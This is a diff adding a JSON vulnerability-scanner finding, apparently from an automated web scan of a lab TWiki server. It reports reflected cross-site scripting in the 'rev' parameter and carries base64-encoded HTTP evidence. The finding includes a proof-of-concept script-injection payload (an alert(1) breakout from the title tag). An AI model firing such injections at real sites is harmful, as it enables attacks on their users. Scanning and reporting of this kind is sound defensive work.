@@ -1,0 +1,69 @@
+{
+  "name": "Cross-site scripting (reflected)",
+  "type": "vulnerability",
+  "severity": "High",
+  "confidence": "Certain",
+  "host": "",
+  "path": "/twiki/bin/view/Main/WebHome",
+  "url": "/twiki/bin/view/Main/WebHome",
+  "evidence": [
+    {
+      "type": "FirstOrderEvidence",
+      "detail": {
+        "payload": {
+          "bytes": "fX1nb2VwMTwvdGl0bGU+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pmw3bGdu",
+          "flags": 4
+        },
+        "band_flags": [
+          "in_band"
+        ]
+      },
+      "request_response": {
+        "url": "http://10.1.3.2/twiki/bin/view/Main/WebHome?rev=1.19%7d%7dgoep1%3c%2ftitle%3e%3cscript%3ealert(1)%3c%2fscript%3el7lgn",
+        "request": [
+          {
+            "type": "DataSegment",
+            "data": "R0VUIC90d2lraS9iaW4vdmlldy9NYWluL1dlYkhvbWU/cmV2PTEuMTk=",
+            "length": 41
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "JTdkJTdkZ29lcDElM2MlMmZ0aXRsZSUzZSUzY3NjcmlwdCUzZWFsZXJ0KDEpJTNjJTJmc2NyaXB0JTNlbDdsZ24=",
+            "length": 65
+          },
+          {
+            "type": "DataSegment",
+            "data": "IEhUVFAvMS4xDQpIb3N0OiAxMC4xLjMuMg0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpTZWMtQ0gtVUE6ICJHb29nbGUgQ2hyb21lIjt2PSIxMzgiLCAiTm90PUE/QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjEzOCINClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpTZWMtQ0gtVUEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzOC4wLjAuMCBTYWZhcmkvNTM3LjM2DQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KU2VjLUZldGNoLVNpdGU6IG5vbmUNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVVzZXI6ID8xDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvbm5lY3Rpb246IGNsb3NlDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpSZWZlcmVyOiBodHRwOi8vMTAuMS4zLjIvdHdpa2kvYmluL3ZpZXcvTWFpbi9XZWJIb21lDQpDb250ZW50LUxlbmd0aDogMA0KDQo=",
+            "length": 734
+          }
+        ],
+        "response": [
+          {
+            "type": "DataSegment",
+            "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUaHUsIDA0IFNlcCAyMDI1IDE0OjI4OjU1IEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjggKFVidW50dSkgREFWLzINCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogMzU4Nw0KDQo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4iIGxhbmc9ImVuIj4gCjxoZWFkPgogPHRpdGxlPiBUV2lraSAuIE1haW4gLiBXZWJIb21lICAocjEuMTl9fQ==",
+            "length": 418
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "Z29lcDE8L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD5sN2xnbg==",
+            "length": 43
+          },
+          {
+            "type": "DataSegment",
+            "data": "KSA8L3RpdGxlPg==",
+            "length": 10
+          },
+          {
+            "type": "SnipSegment",
+            "length": 3295
+          }
+        ],
+        "was_redirect_followed": false,
+        "request_time": "523"
+      }
+    }
+  ],
+  "description": "The value of the <b>rev</b> request parameter is copied into the HTML document as text between TITLE tags. The payload <b>}}goep1&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;l7lgn</b> was submitted in the rev parameter. This input was echoed as <b>goep1&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;l7lgn</b> in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.",
+  "remediation": "",
+  "references": []
+}
